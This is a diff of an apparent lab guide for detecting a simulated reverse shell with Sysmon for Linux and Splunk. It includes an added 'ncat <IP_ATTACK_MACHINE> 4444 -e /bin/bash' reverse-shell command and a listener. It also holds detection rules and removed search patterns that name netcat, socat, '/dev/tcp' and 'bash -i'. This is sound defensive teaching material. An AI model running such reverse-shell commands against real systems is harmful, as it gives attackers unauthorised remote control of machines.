@@ -28,42 +28,36 @@
 
      ```bash
 
-     git clone https://github.com/Sysinternals/SysmonForLinux.git
-     cd SysmonForLinux
-
      ```
 
-   - Build and install Sysmon:
+   # Add Microsoft repository key
 
-     ```bash
+   wget -q https://packages.microsoft.com/config/ubuntu/$(lsb_release -rs)/packages-microsoft-prod.deb -O packages-microsoft-prod.deb
+   sudo dpkg -i packages-microsoft-prod.deb
 
-     sudo apt update
-     sudo apt install gcc make -y
-     make
-     sudo make install
+   # Update and install Sysmon for Linux
 
-     ```
+   sudo apt-get update
+   sudo apt-get install sysmonforlinux -y
 
-   - Confirm the installation:
+   ```
 
-     ```bash
-
-     sysmon -v
-     ```
+   ```
 
 2. **Configure Sysmon**:
 
    - Create a Sysmon configuration file:
 
-     ```bash
+  ```bash
 
-     sudo nano /etc/sysmon/sysmon.conf
+   sudo nano sysmon-config.xml
 
-     ```
+   ```
 
    - This configuration covers multiple `MITRE ATT&CK` techniques for `process creation, network connections, file creation, persistence, environment injection, and process termination`.
 
    - Add the following content to monitor process creation:
+   ```
 
 ```xml
 <!--
@@ -101,14 +95,17 @@ NG FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS 
           <Image condition="is">/bin/dd</Image>
           <CommandLine condition="contains all">dd;if=</CommandLine>
         </Rule>
+        <Rule name="TechniqueID=T1105,TechniqueName=Ingress Tool Transfer - Ncat" groupRelation="and">
+            <Image condition="end with">ncat</Image>
+            <Image condition="end with">nc</Image>
+            <CommandLine condition="contains">-e</CommandLine> <!-- Detects reverse shell option -->
+            <CommandLine condition="contains any">/bin/bash;/bin/sh;/bin/dash</CommandLine> <!-- Shell execution -->
+        </Rule>
+
         <Rule name="TechniqueID=T1033,TechniqueName=System Owner/User Discovery" groupRelation="or">
+          <CommandLine condition="contains">/var/run/utmp</CommandLine>
           <CommandLine condition="contains">/var/log/btmp</CommandLine>
           <CommandLine condition="contains">/var/log/wtmp</CommandLine>
-          <CommandLine condition="contains">/var/run/utmp</CommandLine>
-          <Image condition="contains">/usr/bin/last</Image>
-          <Image condition="contains">/usr/bin/lastb</Image>
-          <Image condition="contains">/usr/bin/who</Image>
-          <Image condition="contains">/usr/bin/w</Image>
         </Rule>
         <Rule name="TechniqueID=T1053.003,TechniqueName=Scheduled Task/Job: Cron" groupRelation="or">
           <Image condition="end with">crontab</Image>
@@ -135,7 +132,6 @@ NG FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS 
         </Rule>
         <Rule name="TechniqueID=T1123,TechniqueName=Audio Capture" groupRelation="and">
           <Image condition="contains">/bin/aplay</Image>
-          <Image condition="contains">wget</Image>
           <CommandLine condition="contains">arecord</CommandLine>
         </Rule>
         <Rule name="TechniqueID=T1136.001,TechniqueName=Create Account: Local Account" groupRelation="or">
@@ -178,29 +174,17 @@ NG FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS 
           <Image condition="end with">setreuid</Image>
           <Image condition="end with">setregid</Image>
         </Rule>
-        <Rule name="SSH Connection" groupRelation="and">
-          <Image condition="end with">ssh</Image>
-          <CommandLine condition="contains">ConnectTimeout=</CommandLine>
-          <CommandLine condition="contains">BatchMode=yes</CommandLine>
-          <CommandLine condition="contains">sshd</CommandLine>
-          <CommandLine condition="contains">ssh</CommandLine>
-        </Rule>
-        <Rule name="wget or curl" groupRelation="or">
-          <Image condition="end with">wget</Image>
-          <Image condition="end with">curl</Image>
-        </Rule>
       </ProcessCreate>
     </RuleGroup>
     <!-- Event ID 3 == NetworkConnect Detected -->
-    <RuleGroup name="IngressToolTransfer" groupRelation="or">
+    <RuleGroup name="" groupRelation="or">
       <NetworkConnect onmatch="include">
         <Rule name="TechniqueID=T1105,TechniqueName=Ingress Tool Transfer" groupRelation="or">
           <Image condition="end with">wget</Image>
           <Image condition="end with">curl</Image>
           <Image condition="end with">ftpget</Image>
+          <Image condition="end with">tftp</Image>
           <Image condition="end with">lwp-download</Image>
-          <Image condition="end with">lwp-download</Image>
-          <DestinationIp condition="is not">127.0.0.1</DestinationIp>
         </Rule>
       </NetworkConnect>
     </RuleGroup>
@@ -250,29 +234,6 @@ NG FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS 
     <RuleGroup name="" groupRelation="or">
       <FileDelete onmatch="include" />
     </RuleGroup>
-
-    <!-- Process events -->
-    <RuleGroup name="Process Monitoring" groupRelation="or">
-      <ProcessCreate onmatch="include"/>
-      <ProcessTerminate onmatch="include"/>
-    </RuleGroup>
-
-    <!-- File events -->
-    <RuleGroup name="File Monitoring" groupRelation="or">
-      <FileCreate onmatch="include"/>
-      <FileDelete onmatch="include"/>
-    </RuleGroup>
-
-    <!-- Network events -->
-    <RuleGroup name="Network Monitoring" groupRelation="or">
-      <NetworkConnect onmatch="include"/>
-    </RuleGroup>
-
-     <!-- DNS queries -->
-    <RuleGroup name="DNS Monitoring" groupRelation="or">
-      <DnsQuery onmatch="include"/>
-    </RuleGroup>
-
   </EventFiltering>
 </Sysmon>
 ```
@@ -283,7 +244,8 @@ NG FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS 
 
   sudo sysmon -i sysmon-config.xml
 
-  systemctl restart sysmon
+  sudo systemctl restart sysmon
+  sudo systemctl status sysmon
 
   ```
 
@@ -297,7 +259,6 @@ NG FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS 
 
      ```bash
      sudo apt install ncat net-tools -y
-
      ncat -lvnp 4444
 
      ```
@@ -306,26 +267,28 @@ NG FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS 
 
      ```bash
 
-     sudo apt install ncat net-tools -y
-     ncat <IP_ATTACK_MACHINE> 4444 -e /bin/bash
-
      ```
 
+   sudo apt install ncat net-tools -y
+   ncat <IP_ATTACK_MACHINE> 4444 -e /bin/bash
+
+   ```
+
    - Replace `<attacker-ip>` with the IP address of the attacking machine.
+
+   ```
 
 2. **Verify the Process Execution on Victim machine**:
 
    - List running processes on the Ubuntu server:
 
-     ```bash
+   ```bash
 
-     sudo lsof -i :4444
+   sudo lsof -i :4444
+   netstat -tulnp | grep 4444
+   ps -ef | grep ncat
 
-     netstat -tulnp | grep 4444
-
-     ps -p <PID> -o pid,user,cmd //Check Running Processes
-
-     ```
+   ```
 
 ---
 
@@ -377,42 +340,14 @@ NG FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS 
 
    - Run a query to find all process creation events:
 
-     ```bash
+     ```
 
-     index="linux_os_logs"  process=sysmon TechniqueName=Command
+     ```
 
-     index="linux_os_logs"  process=sysmon TechniqueName=Command "ncat"
+   index="linux_os_logs" process=sysmon TechniqueName="Command" "ncat"
 
-     index="linux_os_logs" process=sysmon TechniqueName=Command (ncat OR netcat OR "bash -i" OR curl OR wget OR "python -c" OR "perl -e" OR "php -r" OR socat OR "/dev/tcp" OR "chmod 777" OR scp)
+   ```
 
-     index="linux_os_logs" process=sysmon TechniqueName=Command
-     | rex field=_raw "(?i)(?P<command_executed>ncat|netcat|bash -i|curl|wget|python -c|perl -e|php -r|socat|/dev/tcp|chmod 777|scp)"
-     | stats count by host, command_executed, _time
-     | sort - count
-
-     index="linux_os_logs" process=sysmon TechniqueName=Command
-     | rex field=_raw "(?i)(?P<command_executed>ncat|netcat|bash -i|curl|wget|python -c|perl -e|php -r|socat|/dev/tcp|chmod 777|scp)"
-     | timechart span=30m count by command_executed
-
-   index="linux_os_logs" process=sysmon
-   | where like(\_raw, "%/etc/cron%") OR like(\_raw, "%/etc/systemd/system%")
-   | stats count by host, \_raw, \_time
-   | sort -\_time
-
-   index="linux_os_logs" process=sysmon
-   | where like(\_raw, "%/etc/cron%") OR like(\_raw, "%/etc/systemd/system%")
-   | bin \_time span=1h
-   | stats count by \_time, host
-   | sort \_time
-
-   index="linux_os_logs" process=sysmon
-   | where like(\_raw, "%/etc/cron%") OR like(\_raw, "%/etc/systemd/system%")
-   | timechart span=1h count by host
-
-   index="linux_os_logs" process=sysmon
-   | rex field=\_raw "(?i)(?P<command_executed>ncat|netcat|bash -i|curl|wget|python -c|perl -e|php -r|socat|/dev/tcp|chmod 777|scp)\s(?P<command_args>.\*)"
-   | stats count by host, command_executed, command_args, \_time
-   | sort -count
    ```
 
 2. **Visualize Process Trends**:
@@ -428,13 +363,8 @@ NG FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS 
 
      ```bash
      ps aux | grep bash
-
-     ```
-
-   - Terminate the process:
-
-     ```bash
      sudo kill <pid>
+     sudo iptables -A OUTPUT -p tcp --dport 4444 -j DROP
 
      ```
 
